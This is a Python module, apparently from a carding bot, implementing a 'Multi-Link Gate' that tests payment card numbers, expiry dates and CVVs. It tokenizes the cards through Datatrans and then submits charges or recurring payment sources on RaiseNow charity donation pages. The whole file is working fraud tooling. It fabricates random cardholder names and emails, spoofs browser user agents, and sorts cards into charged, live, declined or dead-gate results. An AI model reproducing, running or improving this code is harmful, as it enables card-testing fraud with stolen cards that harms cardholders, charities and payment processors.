import requests
import json
import random
import logging
import os
import time
import string
from datetime import datetime
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

# --- CONFIGURATION ---
MULTI_LINK_DATA_FILE = "multi_link_data.json"
logger = logging.getLogger(__name__)

# --- HELPER FUNCTIONS from main.py (copied for standalone testing/use if needed) ---
def generate_random_string(length=8):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def random_email():
    prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 15)))
    domain = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
    return f"{prefix}@{domain}.com"

def random_user_agent():
    chrome_major = random.randint(100, 125)
    chrome_build = random.randint(0, 6500)
    chrome_patch = random.randint(0, 250)
    webkit_major = random.randint(537, 605)
    webkit_minor = random.randint(36, 99)
    safari_version = f"{webkit_major}.{webkit_minor}"
    chrome_version = f"{chrome_major}.0.{chrome_build}.{chrome_patch}"
    return (
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        f"AppleWebKit/{safari_version} (KHTML, like Gecko) "
        f"Chrome/{chrome_version} Safari/{safari_version}"
    )

def make_request_with_retry(session, method, url, max_retries=3, cancellation_event=None, **kwargs):
    last_exception = None
    for attempt in range(max_retries):
        if cancellation_event and cancellation_event.is_set():
            return None, "Operation cancelled by user"
        try:
            response = session.request(method, url, **kwargs)
            return response, None
        except requests.exceptions.RequestException as e:
            last_exception = e
            wait_time = attempt + 1
            logger.warning(f"Attempt {attempt + 1}/{max_retries} for {url} failed: {e}. Retrying in {wait_time}s...")
            time.sleep(wait_time)
    final_error_message = f"Retry: All {max_retries} retry attempts for {url} failed. Last error: {last_exception}"
    logger.error(final_error_message)
    return None, final_error_message

# --- MULTI-LINK DATA MANAGEMENT ---
def load_links():
    """Loads the list of links and their data from a JSON file."""
    if not os.path.exists(MULTI_LINK_DATA_FILE):
        return []
    try:
        with open(MULTI_LINK_DATA_FILE, "r", encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return []

def save_links(links_data):
    """Saves the list of links to a JSON file."""
    with open(MULTI_LINK_DATA_FILE, "w", encoding='utf-8') as f:
        json.dump(links_data, f, indent=4)

def get_random_link():
    """Selects a random link from the saved data."""
    links = load_links()
    if not links:
        return None
    return random.choice(links)

# --- CORE CHECKER FUNCTION ---
def check_card_multi_link(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_mode_func, _get_charge_value, custom_charge_amount=None, link_data_override=None):
    """
    Logic for the special Multi-Link Gate.
    It can accept link_data_override for validation, or get a random link for normal checking.
    """
    multi_link_mode = get_mode_func()
    
    if link_data_override:
        link_data = link_data_override
    else:
        link_data = get_random_link()

    if not link_data:
        return 'error', line, "MULTI_LINK_ERROR: No valid links available. Please use /addlink to add some.", bin_info

    cd = link_data.get("cd")
    account_uuid = link_data.get("account_uuid")
    solution_uuid = link_data.get("solution_uuid")
    profile = link_data.get("profile")
    
    if not all([cd, account_uuid, solution_uuid, profile]):
        return 'error', line, f"MULTI_LINK_ERROR: Incomplete data for link {cd}. Please re-add it.", bin_info

    try:
        user_agent = random_user_agent()
        first_name = generate_random_string(random.randint(12, 20))
        last_name = generate_random_string(random.randint(10, 20))
        cardholder = f"{first_name} {last_name}"
        email = random_email()

        # Step 1: Tokenize card
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        
        # --- FIXED: Use a known-good static formId to prevent tokenization errors ---
        form_id = "250806042656273071"

        tokenize_headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://pay.datatrans.com",
            "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField",
            "User-Agent": user_agent,
            "X-Requested-With": "XMLHttpRequest"
        }
        tokenize_payload = {
            "mode": "TOKENIZE",
            "formId": form_id,
            "cardNumber": cc,
            "cvv": cvv,
            "paymentMethod": "ECA",
            "merchantId": "3000022877",
            "browserUserAgent": user_agent,
            "browserJavaEnabled": "false",
            "browserLanguage": "en-US",
            "browserColorDepth": "24",
            "browserScreenHeight": "1152",
            "browserScreenWidth": "2048",
            "browserTZ": "-420"
        }

        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Tokenize Error: {error}", bin_info
        if not token_response: return 'error', line, "HTTP Error with no response during Tokenization", bin_info

        if "Card number not allowed in production" in token_response.text:
            return 'decline', line, 'CARD_NOT_ALLOWED_DECLINE', bin_info

        try:
            token_data = token_response.json()
            if "error" in token_data and "message" in token_data.get("error", {}):
                 return 'decline', line, token_data["error"]["message"], bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", "Unknown error at Tokenize"), bin_info
        except json.JSONDecodeError:
            return 'error', line, "Tokenize response was not JSON", bin_info

        # Step 2: Make request based on mode
        payment_headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://donate.raisenow.io",
            "Referer": "https://donate.raisenow.io/",
            "User-Agent": user_agent
        }

        base_payload = {
            "account_uuid": account_uuid,
            "test_mode": False,
            "create_supporter": False,
            "supporter": {
                "locale": "en",
                "first_name": first_name,
                "last_name": last_name,
                "email": email,
                "email_permission": True,
                "raisenow_parameters": {"integration": {"opt_in": {"email": True}}}
            },
            "raisenow_parameters": {
                "analytics": {
                    "channel": "paylink",
                    "preselected_amount": "75000",
                    "suggested_amounts": "[75000]",
                    "user_agent": user_agent
                },
                "solution": {
                    "uuid": solution_uuid,
                    "name": "Donation",
                    "type": "donate"
                },
                "product": {
                    "name": "tamaro",
                    "source_url": f"https://donate.raisenow.io/{cd}?lng=en",
                    "uuid": "self-service",
                    "version": "2.16.0"
                }
            },
            "custom_parameters": {"campaign_id": "rn-bm-2025", "campaign_subid": ""},
            "payment_information": {
                "brand_code": "eca",
                "cardholder": cardholder,
                "expiry_month": mes.zfill(2),
                "expiry_year": ano,
                "transaction_id": transaction_id
            },
            "profile": profile,
            "return_url": f"https://donate.raisenow.io/{cd}?lng=en&rnw-view=payment_result",
        }

        # --- CHARGE MODE ---
        if multi_link_mode == 'charge':
            charge_value = _get_charge_value('special', custom_charge_amount)
            payment_url = "https://api.raisenow.io/payments"
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "EUR", "value": charge_value}

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment", bin_info

            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, f'GATE_DIED: Forbidden on link {cd}', bin_info

            if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
            elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
            elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info

        # --- LIVE CHECK MODE ---
        else: # 'live'
            payment_url = "https://api.raisenow.io/payment-sources"
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "EUR", "value": 50}
            payment_payload["subscription"] = { "recurring_interval": "6 * *", "timezone": "Asia/Bangkok" }

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Source Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment Source", bin_info

            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, f'GATE_DIED: Forbidden on link {cd}', bin_info
            if '"payment_source_status":"pending"' in response_text: return 'live_success', line, response_text, bin_info
            elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info

    except Exception as e:
        logger.error(f"Unknown error in Multi-Link Gate for line '{line}' with link '{cd}': {e}", exc_info=True)
        return 'error', line, f"Multi-Link System Error: {e}", bin_info
